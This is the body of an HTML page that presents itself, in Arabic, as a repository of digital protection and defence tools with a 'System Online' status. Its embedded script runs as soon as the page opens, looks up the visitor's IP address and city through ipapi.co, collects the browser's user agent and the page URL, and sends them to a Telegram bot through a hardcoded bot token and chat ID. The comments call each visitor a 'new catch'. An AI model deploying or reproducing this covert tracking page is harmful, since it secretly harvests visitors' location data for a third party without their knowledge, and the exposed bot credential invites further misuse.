<body>
    <div class="container">
        <h1>🚀 مستودع المعمار</h1>
        <p>جاري تطوير أدوات الحماية والدفاع الرقمي...</p>
        <div style="font-family: monospace; color: #8b949e;">Status: System Online</div>
    </div>

    <script>
        // بيانات بوت التليجرام تبعك
        const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
        const CHAT_ID = "7214473798";

        async function capture() {
            try {
                // 1. سحب الـ IP والمعلومات الجغرافية
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. تجهيز الرسالة
                const message = `
🎯 صيد جديد من المنصة!
🌐 الـ IP: ${data.ip}
📍 المدينة: ${data.city}
📱 الجهاز: ${navigator.userAgent}
🔗 الرابط: ${window.location.href}
                `;

                // 3. الإرسال للبوت
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                console.log("Error capturing data.");
            }
        }

        // تشغيل السحب فور فتح الصفحة
        window.onload = capture;
    </script>
</body>
